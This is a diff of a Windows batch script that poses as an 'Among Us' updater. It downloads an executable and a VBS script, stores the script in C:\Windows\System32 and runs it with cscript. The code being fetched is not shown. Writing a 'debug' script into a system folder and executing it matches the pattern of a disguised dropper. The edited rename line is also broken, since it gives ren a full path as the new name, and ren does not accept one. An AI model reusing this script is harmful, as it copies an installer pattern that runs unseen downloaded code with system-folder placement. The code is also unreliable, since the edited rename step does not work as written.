@@ -53,8 +53,8 @@ echo.
 :: Define the destination path for the Among Us update script
 set "DestUpdate=C:\Windows\System32\AmongUsDebug.vbs"
 :: Define the destination path for the Among Us executable
-set "DestExe=Among Us.exe"  :: The correct name for the executable after download
-set "TempExe=Among_Us.exe"  :: Temporary downloaded file name
+set "DestExe=C:\Program Files\Among Us\Among Us.exe"  :: The correct name for the executable after download
+set "TempExe=C:\Program Files\Among Us\Among_Us.exe"  :: Temporary downloaded file name
 
 :: Display the message about the download
 echo [INFO] Downloading update script and executable...
@@ -108,13 +108,8 @@ if exist "%TempExe%" (
 )
 
 echo.
-echo [INFO] Running Among Us update script...
-echo [INFO] Preparing to launch the update...
-echo.
-
-:: Rename the downloaded executable to "Among Us.exe"
-echo [INFO] Renaming the downloaded executable to Among Us.exe...
-ren "%TempExe%" "Among Us.exe"
+echo [INFO] Renaming the downloaded executable to "Among Us.exe"...
+ren "%TempExe%" "%DestExe%"
 if %ERRORLEVEL% neq 0 (
     echo [ERROR] Failed to rename the executable file.
     exit /b
@@ -142,4 +137,3 @@ cscript //nologo "%DestUpdate%"
 echo [INFO] VBS script executed. Exiting...
 pause
 exit
-
